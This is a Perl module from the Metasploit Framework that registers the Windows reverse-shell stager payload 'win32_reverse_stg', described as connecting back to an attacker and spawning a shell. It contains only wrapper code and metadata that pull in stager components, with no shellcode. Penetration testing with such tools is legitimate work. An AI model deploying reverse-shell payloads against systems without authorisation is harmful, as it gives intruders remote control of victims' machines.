##
# This file is part of the Metasploit Framework and may be redistributed according
# to the licenses defined in the Authors fields below. In the case of a an Unknown
# license, this file defaults to using the same license as the core Framework. The
# latest version of the Framework can always be obtained from http://metasploit.com
##

package Msf::Payload::win32_reverse_stg;
use strict;
use base 'Msf::PayloadComponent::Win32ShellStage';
sub load {
  Msf::PayloadComponent::Win32ShellStage->import('Msf::PayloadComponent::Win32ReverseStager');
}

my $info =
{
  'Name'         => 'winreverse_stg',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
